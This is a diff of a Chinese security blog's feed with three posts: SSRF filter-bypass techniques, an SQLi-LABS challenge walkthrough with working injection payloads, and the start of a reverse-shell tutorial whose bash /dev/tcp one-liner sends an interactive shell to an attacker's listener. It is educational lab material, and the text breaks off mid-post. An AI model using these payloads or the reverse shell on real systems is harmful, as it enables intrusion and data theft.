+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">8进制格式：0300.0250.0.1</span><br><span class="line">16进制格式：0xC0.0xA8.0.1</span><br><span class="line">10进制整数格式：3232235521</span><br><span class="line">16进制整数格式：0xC0A80001</span><br><span class="line">合并后两位：1.1.278 &#x2F; 1.1.755</span><br><span class="line">合并后三位：1.278 &#x2F; 1.755 &#x2F; 3.14159267</span><br></pre></td></tr></table></figure>
+<p>另外IP中的每一位，各个进制可以混用。</p>
+<p>访问改写后的IP地址时，Apache会报400 Bad Request，但Nginx、MySQL等其他服务仍能正常工作。</p>
+<p>另外，0.0.0.0这个IP可以直接访问到本地，也通常被正则过滤遗漏。</p>
+<h3 id="使用解析到内网的域名"><a href="#使用解析到内网的域名" class="headerlink" title="使用解析到内网的域名"></a>使用解析到内网的域名</h3><p>如果服务端没有先解析IP再过滤内网地址，我们就可以使用localhost等解析到内网的域名。<br>另外 xip.io 、xip.name、nip.io、sslip.io提供了一个方便的服务，这个网站的子域名会解析到对应的IP</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">192.168.0.1.xip.io &gt;&gt;&gt; 192.168.0.1</span><br><span class="line">localhost &gt;&gt;&gt; 127.0.0.1</span><br></pre></td></tr></table></figure>
+<h3 id="利用-转跳"><a href="#利用-转跳" class="headerlink" title="利用@转跳"></a>利用@转跳</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.baidu.com@10.10.10.10 &gt;&gt;&gt; http:&#x2F;&#x2F;10.10.10.10 </span><br></pre></td></tr></table></figure>
+<p>当后端程序通过不正确的正则表达式（比如将http之后到com为止的字符内容，也就是<a class="link"   href="http://www.baidu.com/" >www.baidu.com<i class="fas fa-external-link-alt"></i></a> ，认为是访问请求的host地址时）对上述URL的内容进行解析的时候，很有可能会认为访问URL的host为<a class="link"   href="http://www.baidu.com/" >www.baidu.com<i class="fas fa-external-link-alt"></i></a> ，而实际上这个URL所请求的内容都是127.0.0.1上的内容。</p>
+<h3 id="利用短网址（302转跳）"><a href="#利用短网址（302转跳）" class="headerlink" title="利用短网址（302转跳）"></a>利用短网址（302转跳）</h3><p>如果服务器使用正则过滤掉了内网的IP地址，那么可以使用短地址转跳的方法。</p>
+<h3 id="利用Enclosed-alphanumerics"><a href="#利用Enclosed-alphanumerics" class="headerlink" title="利用Enclosed alphanumerics"></a>利用Enclosed alphanumerics</h3><p>一些网络访问工具如Curl等是支持国际化域名（Internationalized Domain Name，IDN）的，国际化域名又称特殊字符域名，是指部分或完全使用特殊的文字或字母组成的互联网域名。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">利用Enclosed alphanumerics</span><br><span class="line">ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ  &gt;&gt;&gt;  example.com</span><br><span class="line">List:</span><br><span class="line">① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h3 id="利用句号"><a href="#利用句号" class="headerlink" title="利用句号"></a>利用句号</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">127。0。0。1  &gt;&gt;&gt;  127.0.0.1</span><br></pre></td></tr></table></figure>
+<h3 id="利用IPv6"><a href="#利用IPv6" class="headerlink" title="利用IPv6[::]"></a>利用IPv6[::]</h3><p>有些服务没有考虑IPv6的情况，但是内网又支持IPv6，则可以使用IPv6的本地IP如 <code>[::]</code> <code>0000::1</code> 或IPv6的内网域名来绕过过滤。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;[::]:80&#x2F;  &gt;&gt;&gt;  http:&#x2F;&#x2F;127.0.0.1</span><br></pre></td></tr></table></figure>
+<h3 id="DNS-Rebinding"><a href="#DNS-Rebinding" class="headerlink" title="DNS Rebinding"></a>DNS Rebinding</h3><p>一个常用的防护思路是：对于用户请求的URL参数，首先服务器端会对其进行DNS解析，然后对于DNS服务器返回的IP地址进行判断，如果在黑名单中，就禁止该次请求。</p>
+<p>但是在整个过程中，第一次去请求DNS服务进行域名解析到第二次服务端去请求URL之间存在一个时间差，利用这个时间差，可以进行DNS重绑定攻击。</p>
+<p>要完成DNS重绑定攻击，我们需要一个域名，并且将这个域名的解析指定到我们自己的DNS Server，在我们的可控的DNS Server上编写解析服务，设置TTL时间为0。这样就可以进行攻击了，完整的攻击流程为：</p>
+<ul>
+<li>服务器端获得URL参数，进行第一次DNS解析，获得了一个非内网的IP</li>
+<li>对于获得的IP进行判断，发现为非黑名单IP，则通过验证</li>
+<li>服务器端对于URL进行访问，由于DNS服务器设置的TTL为0，所以再次进行DNS解析，这一次DNS服务器返回的是内网地址。</li>
+<li>由于已经绕过验证，所以服务器端返回访问内网资源的结果。</li>
+</ul>
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a class="link"   href="https://websec.readthedocs.io/zh/latest/index.html" > Web安全学习笔记<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   href="https://uknowsec.cn/posts/notes/SSRF%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AD%A6%E4%B9%A0.html" >SSRF漏洞的利用与学习<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   href="https://www.anquanke.com/post/id/226240" >ssrf知识点总结<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   href="https://joychou.org/web/phpssrf.html" >SSRF in PHP<i class="fas fa-external-link-alt"></i></a></p>
+]]></content>
+      <categories>
+        <category>安全</category>
+      </categories>
+      <tags>
+        <tag>SSRF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>SQLi-LABS (Challenges) 54-65关</title>
+    <url>/2021/03/07/SQLi-LABS%20(Challenges)%2054-65%E5%85%B3/</url>
+    <content><![CDATA[<p>这一系列的关卡都有个限制，对我们之前所学的知识进行更深层次的运用。</p>
+<h2 id="Less-54"><a href="#Less-54" class="headerlink" title="Less-54"></a>Less-54</h2><p>这一关的数据库每10次查询后会自动重置随机生成新的表名和列名数据，需要我我们在10次尝试以内得出 secret key 。</p>
+<h3 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h3><p>这里再重新演示一次正常的联合注入流程</p>
+<ul>
+<li><strong>判断闭合方式和参数数据类型</strong></li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-54&#x2F;?id&#x3D;1	正常</span><br><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-54&#x2F;?id&#x3D;1&#39;	没有返回</span><br></pre></td></tr></table></figure>
+<p>从这2步可以看出，这里是字符型的参数，并且闭合方式一定是<code>&#39;$id&#39;</code>或者<code>(&#39;$id&#39;)</code>两者之一。</p>
+<ul>
+<li><strong>判断字段数</strong></li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1&#39; order by 3--+	正常</span><br><span class="line">?id&#x3D;1&#39; order by 4--+	没有返回</span><br></pre></td></tr></table></figure>
+<p>得出查询返回的字段数有3个</p>
+<ul>
+<li><strong>查询有可注入的字段</strong></li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,2,3 --+</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210306152449878.png" alt="image-20210306152449878"></p>
+<p>可见字段2，3是可以显示出来的。</p>
+<ul>
+<li>查询表名</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,2,(SELECT+GROUP_CONCAT(table_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.TABLES+WHERE+TABLE_SCHEMA&#x3D;DATABASE()) --+</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210306152613507.png" alt="image-20210306152613507"></p>
+<p>可知表名为 ttyxbfpvca</p>
+<ul>
+<li>查询字段名</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,2,(SELECT+GROUP_CONCAT(column_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+TABLE_NAME&#x3D;&#39;ttyxbfpvca&#39;) --+</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210306152822385.png" alt="image-20210306152822385"></p>
+<p>查到有 id、sessid、secret_IVAU、tryy 这些字段</p>
+<ul>
+<li>查询数据</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,2,(SELECT+GROUP_CONCAT(secret_IVAU)+FROM+ttyxbfpvca) --+</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210306153106710.png" alt="image-20210306153106710"></p>
+<p>拿到 secret key 值为：J1rzyGdPRiKwK5I4iaNlCwuT</p>
+<h2 id="Less-55"><a href="#Less-55" class="headerlink" title="Less-55"></a>Less-55</h2><p>这一关和 Less-54 基本一致，给了14次机会，闭合方式改为了<code>($id)</code></p>
+<h2 id="Less-56"><a href="#Less-56" class="headerlink" title="Less-56"></a>Less-56</h2><p>这一关和 Less-54 相比只是闭合方式换成了<code>(&#39;$id&#39;)</code>，给了14次机会。</p>
+<h2 id="Less-57"><a href="#Less-57" class="headerlink" title="Less-57"></a>Less-57</h2><p>这一关和 Less-54 基本一致，给了14次机会，闭合方式改为了<code>&quot;$id&quot;</code></p>
+<h2 id="Less-58"><a href="#Less-58" class="headerlink" title="Less-58"></a>Less-58</h2><p>这一关只给了5次机会，当然如果知道了要使用什么注入方法后也能绰绰有余</p>
+<ul>
+<li>查看代码</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$unames</span>=<span class="keyword">array</span>(<span class="string">&quot;Dumb&quot;</span>,<span class="string">&quot;Angelina&quot;</span>,<span class="string">&quot;Dummy&quot;</span>,<span class="string">&quot;secure&quot;</span>,<span class="string">&quot;stupid&quot;</span>,<span class="string">&quot;superman&quot;</span>,<span class="string">&quot;batman&quot;</span>,<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;admin1&quot;</span>,<span class="string">&quot;admin2&quot;</span>,<span class="string">&quot;admin3&quot;</span>,<span class="string">&quot;dhakkan&quot;</span>,<span class="string">&quot;admin4&quot;</span>);</span><br><span class="line"><span class="variable">$pass</span> = (<span class="variable">$unames</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Your Login name : &#x27;</span>. <span class="variable">$unames</span>[<span class="variable">$row</span>[<span class="string">&#x27;id&#x27;</span>]];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Your Password : &#x27;</span> .<span class="variable">$pass</span>[<span class="variable">$row</span>[<span class="string">&#x27;id&#x27;</span>]];</span><br></pre></td></tr></table></figure>
+<p>这里查询成功只给你回显预定数组里面的数据，并不是直接回显查询结果，因此无法使用联合注入，我们可以尝试报错注入。</p>
+<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>这里再演示一次报错注入：</p>
+<ul>
+<li>查询表名</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39; and (select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),0x7e)))--+</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210306155346027.png" alt="image-20210306155346027"></p>
+<p>得知表名为：7dvdblb1tl</p>
+<ul>
+<li>查询字段名</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39; and (select extractvalue(1,concat(0x7e,(select group_concat(column_name+SEPARATOR+0x3c62723e) from information_schema.columns where table_name&#x3D;&#39;7dvdblb1tl&#39;),0x7e)))--+</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210306155750151.png" alt="image-20210306155750151"></p>
+<p>由于报错注入回显的字符数有限，如果想要后面的信息，可以加 limit 来限制数量</p>
+<p>这我们已经可以知道想要的字段名为：secret_UPZ7</p>
+<ul>
+<li>查询数据</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39; and (select extractvalue(1,concat(0x7e,(select secret_UPZ7 from 7dvdblb1tl),0x7e)))--+</span><br></pre></td></tr></table></figure>
+<p>得到 secret key 为： JrOfRpU234sYeim4AJuv6zVw</p>
+<h2 id="Less-59"><a href="#Less-59" class="headerlink" title="Less-59"></a>Less-59</h2><p>本关与 Less-58 的思路一样，只是参数的数据类型换成了数字型。</p>
+<h2 id="Less-60"><a href="#Less-60" class="headerlink" title="Less-60"></a>Less-60</h2><p>本关与 Less-58 的思路一样，只是闭合方式改为了<code>(&quot;$id&quot;)</code>。</p>
+<h2 id="Less-61"><a href="#Less-61" class="headerlink" title="Less-61"></a>Less-61</h2><p>本关与 Less-58 的思路一样，只是闭合方式改为了<code>((&#39;$id&#39;))</code>。</p>
+<h2 id="Less-62"><a href="#Less-62" class="headerlink" title="Less-62"></a>Less-62</h2><p>这一关把错误信息显示也屏蔽了，因此只能使用盲注了，由于盲注需要尝试的步骤也比较多，因此这里也给出了130次的机会。同时应该注意到这里的闭合方式为<code>(&#39;$id&#39;)</code></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-62&#x2F;index.php&#x2F;?id&#x3D;1&#39;) and (ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1) ,1,1))) &gt; 1--+</span><br></pre></td></tr></table></figure>
+<p>这里给出sqlmap的结果，注意如果已经运行过一次的话第二次需要清除缓存和cookie</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--flush-session --fresh-queries</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210306172703280.png" alt="image-20210306172703280"></p>
+<h2 id="Less-63"><a href="#Less-63" class="headerlink" title="Less-63"></a>Less-63</h2><p>与 Less-62 注入方式一致，只是闭合方式为<code>&#39;$id&#39;</code></p>
+<h2 id="Less-64"><a href="#Less-64" class="headerlink" title="Less-64"></a>Less-64</h2><p>与 Less-62 注入方式一致，只是闭合方式为<code>(($id))</code></p>
+<h2 id="Less-65"><a href="#Less-65" class="headerlink" title="Less-65"></a>Less-65</h2><p>与 Less-62 注入方式一致，只是闭合方式为<code>(&quot;$di&quot;)</code></p>
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
+<li><a class="link"   href="https://www.sqlsec.com/2020/05/sqlilabs.html#toc-heading-44" >SQLI labs 靶场精简学习记录<i class="fas fa-external-link-alt"></i></a></li>
+</ul>
+<ul>
+<li><a class="link"   href="https://www.cnblogs.com/lcamry/" >lcamry 大佬的《MySQL注入天书》<i class="fas fa-external-link-alt"></i></a></li>
+</ul>
+]]></content>
+      <categories>
+        <category>CTF</category>
       </categories>
       <tags>
         <tag>SQL注入</tag>
@@ -876,6 +1010,224 @@
       </tags>
   </entry>
   <entry>
+    <title>反弹shell</title>
+    <url>/2021/03/29/%E5%8F%8D%E5%BC%B9shell/</url>
+    <content><![CDATA[<h1 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h1><p>​    在介绍反弹链接的时候先说明什么是正向链接：假设我们攻击了一台机器，打开了该机器的一个端口，攻击者在自己的机器去连接目标机器（目标ip：目标机器端口），这是比较常规的形式，我们叫做正向连接。远程桌面，web服务，ssh，telnet等等，都是正向连接。而反弹shell是指攻击者指定服务端，受害者主机主动连接攻击者的服务端程序，就叫反弹连接。本质上是网络概念的客户端与服务端的角色反转。<strong>反弹shell简单来说就是通过命令让靶机的shell的控制权交到攻击者的机器中</strong>。</p>
+<p>可能有人会问：我们都能够在靶机上直接执行命令了，为什么还反弹shell呢？这里有几种情况：</p>
+<ol>
+<li><p>某客户机中了你的网马，但是它在局域网内，你直接连接不了。</p>
+</li>
+<li><p>它的ip会动态改变，你不能持续控制。</p>
+</li>
+<li><p>由于防火墙等限制，对方机器只能发送请求，不能接收请求。</p>
+</li>
+<li><p>靶机执行的命令结果没有回显，无法直接获知运行的状态。</p>
+</li>
+</ol>
+<p>这些情况都可以通过反弹shell来解决。</p>
+<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p>想反弹shell只需要一行或者几行命令，但是这里面涉及到的东西日常比较少用，需要大概了解一下才能弄明白这些命令到底做了什么东西。</p>
+<h3 id="文件描述符"><a href="#文件描述符" class="headerlink" title="文件描述符"></a>文件描述符</h3><blockquote>
+<p>Linux 系统中，把一切都看做是文件，当进程打开现有文件或创建新文件时，内核向进程返回一个文件描述符，文件描述符就是内核为了高效管理已被打开的文件所创建的索引，用来指向被打开的文件，所有执行I/O操作的系统调用都会通过文件描述符。</p>
+</blockquote>
+<p>当Linux启动的时候会默认打开三个文件描述符，分别是：</p>
+<table>
+<thead>
+<tr>
+<th>描述符</th>
+<th>用途</th>
+<th>stdio流</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>0</td>
+<td>标准输入</td>
+<td>stdin</td>
+</tr>
+<tr>
+<td>1</td>
+<td>标准输出</td>
+<td>stdout</td>
+</tr>
+<tr>
+<td>2</td>
+<td>标准错误</td>
+<td>stderr</td>
+</tr>
+</tbody></table>
+<p><strong>文件所有输入输出都是由该进程所有打开的文件描述符控制的。（Linux一切皆文件，就连键盘显示器设备都是文件，因此他们的输入输出也是由文件描述符控制）</strong></p>
+<p>一条命令执行以前先会按照默认的情况进行绑定（也就是上面所说的 0,1,2），如果我们有时候需要让输出不显示在显示器上，而是输出到文件或者其他设备，那我们就需要重定向。</p>
+<h3 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a>重定向</h3><p>重定向主要分为两种(其他复杂的都是从这两种衍生而来的)：</p>
+<ol>
+<li>输入重定向 <code>&lt;</code>、<code> &lt;&lt;</code></li>
+<li>输出重定向 <code>&gt;</code> 、<code>&gt;&gt;</code></li>
+</ol>
+<p><strong>重点</strong>：</p>
+<ol>
+<li><p>bash 在执行一条指令的时候，首先会检查命令中存不存在重定向的符号，如果存在那么首先将文件描述符重定向（之前说过了，输入输出操作都是依赖文件描述符实现的，重定向输入输出本质上就是重定向文件描述符），然后在把重定向去掉，执行指令</p>
+</li>
+<li><p>如果指令中存在多个重定向，那么不要随便改变顺序，因为重定向是从左向右解析的，改变顺序可能会带来完全不同的结果（这一点我们后面会展示）</p>
+</li>
+<li><p><code>&lt;</code> 是对标准输入 0 重定向 ，<code>&gt;</code> 是对标准输出 1 重定向</p>
+</li>
+<li><p><strong>再强调一下，重定向就是针对文件描述符的操作</strong></p>
+</li>
+</ol>
+<h4 id="输入重定向"><a href="#输入重定向" class="headerlink" title="输入重定向"></a>输入重定向</h4><p>格式：（注意[n]与&lt;之间没有空格）</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[n]&lt;word	</span><br></pre></td></tr></table></figure>
+<p>说明：将文件描述符 n 重定向到 word 指代的文件（以只读方式打开）,如果 n 省略就是0（标准输入）</p>
+<p>example:</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@ubuntu18:/home/john/Desktop<span class="comment"># cat 0&lt;file</span></span><br><span class="line">hello wordl</span><br><span class="line">root@ubuntu18:/home/john/Desktop<span class="comment"># cat &lt;file</span></span><br><span class="line">hello wordl</span><br></pre></td></tr></table></figure>
+<p>解释: 解析器解析到 <code>&lt;</code> 以后会先处理重定向，将标准输入重定向到file，之后cat再从标准输入读取指令的时候，由于标准输入已经重定向到了file ，于是cat就从file中读取指令了。</p>
+<h4 id="输出重定向"><a href="#输出重定向" class="headerlink" title="输出重定向"></a>输出重定向</h4><p>格式：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[n]&gt;word	</span><br></pre></td></tr></table></figure>
+<p>说明： 将文件描述符 n 重定向到 word 指代的文件（以写的方式打开），如果 n 省略则默认就是 1（标准输出）</p>
+<p>example：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@ubuntu18:/home/john/Desktop<span class="comment"># echo hello&gt;file</span></span><br><span class="line">root@ubuntu18:/home/john/Desktop<span class="comment"># cat file</span></span><br><span class="line">hello</span><br><span class="line">root@ubuntu18:/home/john/Desktop<span class="comment"># &gt;file echo world</span></span><br><span class="line">root@ubuntu18:/home/john/Desktop<span class="comment"># cat file</span></span><br><span class="line">world</span><br></pre></td></tr></table></figure>
+
+
+<h4 id="标准输出与标准错误输出重定向"><a href="#标准输出与标准错误输出重定向" class="headerlink" title="标准输出与标准错误输出重定向"></a>标准输出与标准错误输出重定向</h4><p>格式：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&amp;&gt; word </span><br><span class="line">&gt;&amp; word</span><br></pre></td></tr></table></figure>
+<p>说明:将标准输出与标准错误输出都定向到word代表的文件（以写的方式打开），两种格式意义完全相同，这种格式完全等价于 <code>&gt; word 2&gt;&amp;1</code></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@ubuntu18:/home/john/Desktop<span class="comment"># mkdir &amp;&gt; file</span></span><br><span class="line">root@ubuntu18:/home/john/Desktop<span class="comment"># cat file</span></span><br><span class="line">mkdir: missing operand</span><br><span class="line">Try <span class="string">&#x27;mkdir --help&#x27;</span> <span class="keyword">for</span> more information.</span><br><span class="line">root@ubuntu18:/home/john/Desktop<span class="comment"># ls &amp;&gt; file</span></span><br><span class="line">root@ubuntu18:/home/john/Desktop<span class="comment"># cat file</span></span><br><span class="line">checksite.sql</span><br><span class="line">DVWA-master</span><br><span class="line">file</span><br><span class="line">make-pdf_V0_1_6</span><br><span class="line">sql.php</span><br><span class="line">sz_checksite</span><br><span class="line">test.txt</span><br></pre></td></tr></table></figure>
+
+
+<h4 id="文件描述符的复制"><a href="#文件描述符的复制" class="headerlink" title="文件描述符的复制"></a>文件描述符的复制</h4><p>格式：**(这里所有字符之间不要有空格)**</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[n]&lt;&amp;[m] </span><br><span class="line">[n]&gt;&amp;[m] </span><br></pre></td></tr></table></figure>
+<p>说明：</p>
+<ol>
+<li><p>这里两个<strong>都是将文件描述符 n 复制到 m</strong> ，两者的区别是，前者是以只读的形式打开，后者是以写的形式打开，<strong>因此 0&lt;&amp;1 和 0&gt;&amp;1 是完全等价的（读/写方式打开对其没有任何影响）</strong></p>
+</li>
+<li><p>这里的 &amp; 目的是为了区分数字名字的文件和文件描述符，如果没有 &amp; 系统会认为是将文件描述符重定向到了一个数字作为文件名的文件，而不是一个文件描述符。</p>
+</li>
+</ol>
+<p><strong>重点：</strong></p>
+<p>之前我们说过，重定向符号的顺序不能随便换，因为系统是从左到右执行的，我们下面就举一个例子</p>
+<ul>
+<li>cmd &gt; file 2&gt;&amp;1</li>
+</ul>
+<p>这个是先把标准输出<code>stdout1</code>重定向到file文件中，然后把标准错误<code>stderr2</code>重定向到标准输出所指向的文件中，也就是file。</p>
+<ul>
+<li>cmd 2&gt;&amp;1 &gt;file</li>
+</ul>
+<p>这一个是先把标准错误<code>stderr2</code>重定向到标准输出<code>stdout1</code>所指向的文件，这里默认是屏幕，然后再把标准输出<code>stdout1</code>重定向到file文件中。</p>
+<h4 id="exec-绑定重定向"><a href="#exec-绑定重定向" class="headerlink" title="exec 绑定重定向"></a>exec 绑定重定向</h4><p>格式：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">exec</span> [n] &lt;/&gt; file/[n]</span><br></pre></td></tr></table></figure>
+<p>上面的输入输出重定向将输入和输出绑定文件或者设备以后只对当前的那条指令有效，如果需要接下来的指令都支持的话就需要使用 exec 指令</p>
+<p><strong>重点：</strong></p>
+<p>格式： </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[n]&lt;&gt;word</span><br></pre></td></tr></table></figure>
+<p>说明：以读写方式打开word指代的文件，并将n重定向到该文件。如果n不指定的话，默认为标准输入。</p>
+<p>example：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@ubuntu18:/home/john/Desktop<span class="comment"># exec 3&lt;&gt;file</span></span><br><span class="line">root@ubuntu18:/home/john/Desktop<span class="comment"># ls &gt;&amp;3</span></span><br><span class="line">root@ubuntu18:/home/john/Desktop<span class="comment"># cat file</span></span><br><span class="line">checksite.sql</span><br><span class="line">DVWA-master</span><br><span class="line">file</span><br><span class="line">make-pdf_V0_1_6</span><br><span class="line">sql.php</span><br><span class="line">sz_checksite</span><br><span class="line">test.txt</span><br><span class="line">root@ubuntu18:/home/john/Desktop<span class="comment"># exec 3&lt;&gt;file</span></span><br><span class="line">root@ubuntu18:/home/john/Desktop<span class="comment"># cat &lt;&amp;3</span></span><br><span class="line">checksite.sql</span><br><span class="line">DVWA-master</span><br><span class="line">file</span><br><span class="line">make-pdf_V0_1_6</span><br><span class="line">sql.php</span><br><span class="line">sz_checksite</span><br><span class="line">test.txt</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>学完了前置知识，接下来就看看反弹shell的原理部分。</p>
+<p>实验环境：</p>
+<ul>
+<li><p>靶机（Ubuntu）IP：192.168.91.144</p>
+</li>
+<li><p>攻击机（Kali）IP：192.168.91.128</p>
+</li>
+</ul>
+<p>首先在攻击机上开启监听端口：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lvp 2333</span><br></pre></td></tr></table></figure>
+<p>然后再靶机上执行：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.91.128/2333 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+<p>然后就可以看到攻击机控制了靶机的shell</p>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210325215552795.png" alt="image-20210325215552795"></p>
+<p>命令解释：</p>
+<ul>
+<li><p><strong>bash -i</strong></p>
+<ol>
+<li><p>bash 是linux 的一个比较常见的shell,其实linux的shell还有很多，比如 sh、zsh、等，他们之间有着细小差别</p>
+</li>
+<li><p>-i 这个参数表示的是产生交互式的shell</p>
+</li>
+</ol>
+</li>
+<li><p><strong>/dev/tcp/ip/port</strong></p>
+</li>
+</ul>
+<p>/dev/tcp|udp/ip/port 这个文件是特别特殊的，实际上可以将其看成一个设备（Linux下一切皆文件），其实如果你访问这个文件的位置他是不存在的。但是如果你在一方监听端口的情况下对这个文件进行读写，就能实现与监听端口的服务器的socket通信。</p>
+<p>example：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#靶机输入</span></span><br><span class="line">root@ubuntu18:~<span class="comment"># echo hello world &gt; /dev/tcp/192.168.91.128/2333</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#攻击机接收</span></span><br><span class="line">root@kali:~<span class="comment"># nc -lvp 2333</span></span><br><span class="line">listening on [any] 2333 ...</span><br><span class="line">192.168.91.144: inverse host lookup failed: Unknown host</span><br><span class="line">connect to [192.168.91.128] from (UNKNOWN) [192.168.91.144] 32960</span><br><span class="line">hello world</span><br></pre></td></tr></table></figure>
+<p>example：</p>
